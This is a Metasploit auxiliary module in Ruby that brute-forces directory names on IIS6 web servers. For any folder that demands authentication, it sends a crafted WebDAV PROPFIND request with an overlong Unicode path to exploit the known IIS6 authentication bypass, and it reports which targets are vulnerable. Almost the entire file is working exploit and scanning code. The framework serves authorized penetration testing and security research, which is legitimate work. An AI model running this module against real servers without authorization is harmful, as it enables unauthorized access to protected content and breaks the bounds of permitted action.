##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WMAPScanDir
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,	
			'Name'   		=> 'MS09-XXX 0day IIS6 WebDAV Unicode Auth Bypass Directory Scanner',
			'Description'	=> %q{
				This module is based on et's HTTP Directory Scanner module,
				with one exception. Where authentication is required, it attempts
				to bypass authentication using the WebDAV IIS6 Unicode vulnerability
				discovered by Kingcope. The vulnerability appears to be exploitable
				where WebDAV is enabled on the IIS6 server, and any protected folder
				requires either Basic, Digest or NTLM authentication.
			},
			'Author' 		=> [ 'patrick' ],
			'License'		=> MSF_LICENSE,
			'Version'		=> '$Revision$'))   
			
		register_options(
			[
				OptString.new('PATH', [ true,  "The path  to identify files", '/']),
				OptInt.new('ERROR_CODE', [ true, "Error code for non existent directory", 404]),
				OptPath.new('DICTIONARY',   [ false, "Path of word dictionary to use", 
						File.join(Msf::Config.install_root, "data", "wmap", "wmap_dirs.txt")
					]
				),
				OptPath.new('HTTP404S',   [ false, "Path of 404 signatures to use", 
						File.join(Msf::Config.install_root, "data", "wmap", "wmap_404s.txt")
					]
				)				
			], self.class)	
						
	end

	def run_host(ip)
		conn = true
		ecode = nil
		emesg = nil
	
		tpath = datastore['PATH'] 	
		if tpath[-1,1] != '/'
			tpath += '/'
		end
 	
		ecode = datastore['ERROR_CODE'].to_i
		vhost = datastore['VHOST'] || wmap_target_host
		prot  = datastore['SSL'] ? 'https' : 'http'
		
		 
		#
		# Detect error code
		# 		
		begin
			randdir = Rex::Text.rand_text_alpha(5).chomp + '/'
			res = send_request_cgi({
				'uri'  		=>  tpath+randdir,
				'method'   	=> 'GET',
				'ctype'		=> 'text/html'
			}, 20)

			return if not res
			
			tcode = res.code.to_i 

	
			# Look for a string we can signature on as well
			if(tcode >= 200 and tcode <= 299)
			
				File.open(datastore['HTTP404S']).each do |str|
					if(res.body.index(str))
						emesg = str
						break
					end
				end

				if(not emesg)
					print_status("Using first 256 bytes of the response as 404 string")
					emesg = res.body[0,256]
				else
					print_status("Using custom 404 string of '#{emesg}'")
				end
			else
				ecode = tcode
				print_status("Using code '#{ecode}' as not found.")
			end
			
			
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			conn = false		
		rescue ::Timeout::Error, ::Errno::EPIPE			
		end

		return if not conn

		webdav_req = %q|<?xml version="1.0" encoding="utf-8"?><propfind xmlns="DAV:"><prop><getcontentlength xmlns="DAV:"/><getlastmodified xmlns="DAV:"/><executable xmlns="http://apache.org/dav/props/"/><resourcetype xmlns="DAV:"/><checked-in xmlns="DAV:"/><checked-out xmlns="DAV:"/></prop></propfind>|

		File.open(datastore['DICTIONARY']).each do |testf|
			begin
				testfdir = testf.chomp + '/'
				res = send_request_cgi({
					'uri'  		=>  tpath + testfdir,
					'method'   	=> 'PROPFIND',
					'ctype'		=> 'application/xml',
					'headers' 	=> 
						{
						},
					'data'		=> webdav_req + "\r\n\r\n",
				}, 20)

				
				if(not res or ((res.code.to_i == ecode) or (emesg and res.body.index(emesg))))
					print_status("NOT Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
				elsif (res.code.to_i == 401)
					print_status("Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
					print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
					
					bogus = Rex::Text.to_unicode( Rex::Text.rand_text(Kernel.rand(32)), 'utf-8', 'overlong', 1+(Kernel.rand(6)) )
					res = send_request_cgi({
						'uri'  		=>  tpath + bogus + testfdir,
						'method'   	=> 'PROPFIND',
						'ctype'		=> 'application/xml',
						'headers' 	=> 
							{
								#'Translate'	 => 'f', # Not required in PROPFIND, only GET - patrickw 20091518
							},
						'data'		=> webdav_req + "\r\n\r\n",
					}, 20)
					
					if (res.code.to_i == 207)
						print_status("\tFound vulnerable WebDAV Unicode bypass target #{wmap_base_url}#{tpath}%c0%af#{testfdir} #{res.code} (#{wmap_target_host})")

						rep_id = wmap_base_report_id(
										wmap_target_host,
										wmap_target_port,
										wmap_target_ssl
								)
						vul_id = wmap_report(rep_id,'DIRECTORY','NAME',"#{tpath}#{testfdir}","Directory #{tpath}#{testfdir} found.")
						wmap_report(vul_id,'DIRECTORY','RESP_CODE',"#{res.code}",nil)
					end
				
				else
					print_status("Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
					rep_id = wmap_base_report_id(
									wmap_target_host,
									wmap_target_port,
									wmap_target_ssl
							)
					vul_id = wmap_report(rep_id,'DIRECTORY','NAME',"#{tpath}#{testfdir}","Directory #{tpath}#{testfdir} found.")
					wmap_report(vul_id,'DIRECTORY','RESP_CODE',"#{res.code}",nil)
				end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE			
			end
		end
	
	end
end
